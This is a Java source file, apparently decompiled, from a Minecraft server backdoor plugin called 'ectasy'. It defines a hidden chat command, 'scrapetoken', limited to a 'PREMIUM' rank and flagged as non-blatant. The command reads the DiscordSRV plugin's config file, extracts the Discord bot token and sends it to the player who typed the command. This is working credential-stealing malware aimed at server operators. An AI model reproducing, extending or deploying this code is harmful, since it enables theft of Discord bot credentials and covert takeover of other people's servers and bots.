package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import java.io.File;
import java.nio.file.Files;
import org.apache.commons.io.IOUtils;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "scrapetoken",
   description = "Scrape DiscordSRV's token",
   blatant = false,
   rank = Rank.PREMIUM
)
public class ScrapeDiscordTokenCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      File var4 = new File("plugins/DiscordSRV/config.yml");
      if (!var4.exists()) {
         ChatUtil.sendChat(var1.getPlayer(), "DiscordSRV config file not found.");
      } else {
         try {
            IOUtils.readLines(Files.newInputStream(var4.toPath())).forEach(s -> {
               if (s.startsWith("BotToken:")) {
                  String token = s.replace("BotToken: ", "").replace("\"", "");
                  ChatUtil.sendChat(var1.getPlayer(), "Found token : " + token);
               }
            });
         } catch (Exception var6) {
            ChatUtil.sendChat(var1.getPlayer(), "Error : " + var6.getMessage());
         }
      }
   }
}
